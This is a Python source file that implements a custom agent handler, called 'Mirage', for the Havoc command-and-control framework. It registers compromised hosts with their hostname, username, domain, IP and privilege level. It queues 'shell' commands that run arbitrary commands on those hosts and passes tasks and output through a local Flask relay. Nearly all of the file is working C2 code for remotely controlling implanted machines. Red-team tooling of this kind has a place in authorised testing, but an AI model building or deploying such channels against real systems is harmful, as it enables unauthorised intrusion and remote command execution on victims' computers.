from base64 import b64decode, b64encode
import json
import requests as http
import time
import base64
import struct
from threading import Thread
from havoc.service import HavocService
from havoc.agent import *
import os

FLASK_URL = "http://127.0.0.1:4696"

COMMAND_SHELL = 0x152
COMMAND_EXIT  = 0x155


class CommandShell(Command):
    CommandId   = COMMAND_SHELL
    Name        = "shell"
    Description = "executes commands"
    Help        = ""
    NeedAdmin   = False
    Params      = [CommandParam(name="commands", is_file_path=False, is_optional=False)]
    Mitr        = []

    def job_generate(self, arguments: dict):
        Task = Packer()
        Task.add_data(arguments['commands'])
        return Task.buffer


class CommandExit(Command):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the python agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate(self, arguments: dict):
        Task = Packer()
        Task.add_data("goodbye")
        return Task.buffer


class python(AgentType):
    Name        = "Mirage"
    Author      = "@711intern"
    Version     = "1.0"
    Description = "Super cool custom C2 channel agent."
    MagicValue  = 0x41414141

    Arch           = ["x64", "x86"]
    Formats        = [{"Name": "Python script", "Extension": "py"}]
    BuildingConfig = {"Sleep": "10"}
    Commands       = [CommandShell(), CommandExit()]

    _registered_agents: dict = {}

    def _relay_to_agent(self, data: bytes):
        try:
            encoded = b64encode(data).decode('utf-8')
            http.post(f"{FLASK_URL}/api/sync", json={"data": encoded})
            print(f"[+] Relayed {len(data)} bytes to agent via Flask")
        except Exception as e:
            print(f"[-] Flask relay failed: {e}")

    def _poll_flask(self):
        seen = set()
        print("[+] Flask poller running")

        while True:
            try:
                r         = http.get(f"{FLASK_URL}/api/sync")
                agentdata = r.json().get("data")
            except Exception:
                agentdata = None

            if agentdata and agentdata not in seen:
                try:
                    raw = base64.b64decode(agentdata)
                except Exception as e:
                    print(f"[-] Decode error: {e}")
                    time.sleep(0.5)
                    continue

                payload_str = raw[12:].decode('utf-8', errors='ignore')
                is_register = "register" in payload_str
                is_gettask  = "gettask"  in payload_str

                print(f"[+] {'Register' if is_register else 'Gettask' if is_gettask else 'Unknown'} packet ({len(raw)} bytes)")

                size_val    = struct.unpack(">I", raw[:4])[0]
                magic_hex   = raw[4:8].hex()
                agentid_hex = raw[8:12].hex()
                agentid_int = int(agentid_hex, 16)
                name_id     = f"{agentid_int:08x}"

                full_agent = self._registered_agents.get(name_id, {"NameID": name_id})

                fake_response = {
                    "AgentHeader": {
                        "Size":       str(size_val),
                        "MagicValue": magic_hex,
                        "AgentID":    agentid_hex
                    },
                    "Response": b64encode(raw[12:]).decode('utf-8'),
                    "Agent":    full_agent
                }

                self.response(fake_response)

                if is_register:
                    seen.add(agentdata)
                elif is_gettask:
                    seen.clear()

            time.sleep(0.5)

    def generate(self, config: dict):
        self.builder_send_message(config['ClientID'], "Info", "hello from service builder")
        self.builder_send_payload(config['ClientID'], self.Name + ".bin", b"test bytes")

    def response(self, response: dict):
        print("[*] Received request from agent")

        agent_header   = response["AgentHeader"]
        agent_response = b64decode(response["Response"])

        try:
            agentjson = json.loads(agent_response)
        except Exception as e:
            print(f"[-] JSON parse failed: {e}")
            self._relay_to_agent(b'')
            return b''

        task = agentjson.get("task", "")
        print(f"[*] Task type: {task}")

        if task == "register":
            print("[*] Processing registration...")
            try:
                agent_details = json.loads(agentjson["data"])
            except Exception:
                agent_details = agentjson["data"]

            agentid_hex = agent_header["AgentID"]
            agentid_int = int(agentid_hex, 16)
            name_id     = f"{agentid_int:08x}"

            profile = {
                "NameID":            name_id,
                "Hostname":          agent_details.get("Hostname", ""),
                "Username":          agent_details.get("Username", ""),
                "Domain":            agent_details.get("Domain", ""),
                "InternalIP":        agent_details.get("InternalIP", ""),
                "Process Path":      agent_details.get("ProcessPath", ""),
                "Process Name":      agent_details.get("ProcessName", "python"),
                "Process Arch":      agent_details.get("Architecture", "x64"),
                "Process ID":        str(agent_details.get("PID", 0)),
                "Process Parent ID": str(agent_details.get("PPID", 0)),
                "Process Elevated":  str(agent_details.get("Elevated", False)),
                # 5 dot-separated ints: major.minor.workstation_flag.sp.build
                # [10, 0, 1, 0, 19041] -> Windows 10
                "OS Version":        "10.0.1.0.19041",
                "OS Build":          agent_details.get("OSBuild", "19041"),
                "OS Arch":           agent_details.get("Architecture", "x64"),
                "SleepDelay":        str(agent_details.get("Sleep", 5)),
            }

            self._registered_agents[name_id] = profile

            self.register(agent_header, profile)
            self.console_message(name_id, "Good", f"Agent {name_id} registered!", "")
            print(f"[+] Registered agent: {name_id}")

            self._relay_to_agent(b'registered')
            return b'registered'

        elif task == "gettask":
            agent_obj = response.get("Agent")
            if not agent_obj:
                print("[-] No Agent object")
                self._relay_to_agent(b'notask')
                return b'notask'

            name_id = agent_obj.get("NameID", "unknown")
            print(f"[*] Agent {name_id} checking in")

            output = agentjson.get("data", "")
            if output:
                self.console_message(name_id, "Good", "Output:", output)

            Tasks = self.get_task_queue(agent_obj)
            print(f"[DEBUG] Tasks: {repr(Tasks)}")

            if Tasks and len(Tasks) > 0:
                self._relay_to_agent(Tasks)
                return Tasks
            else:
                self._relay_to_agent(b'notask')
                return b'notask'

        print(f"[-] Unknown task: {task}")
        self._relay_to_agent(b'')
        return b''


def main():
    Havoc_python = python()
    print(os.getpid())
    print("[*] Connect to Havoc service API")

    havoc_service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print("[*] Register agent with Havoc")
    havoc_service.register_agent(Havoc_python)

    poller = Thread(target=Havoc_python._poll_flask, daemon=True)
    poller.start()
    print("[+] Poller thread started")

    while True:
        time.sleep(1)


if __name__ == '__main__':
    main()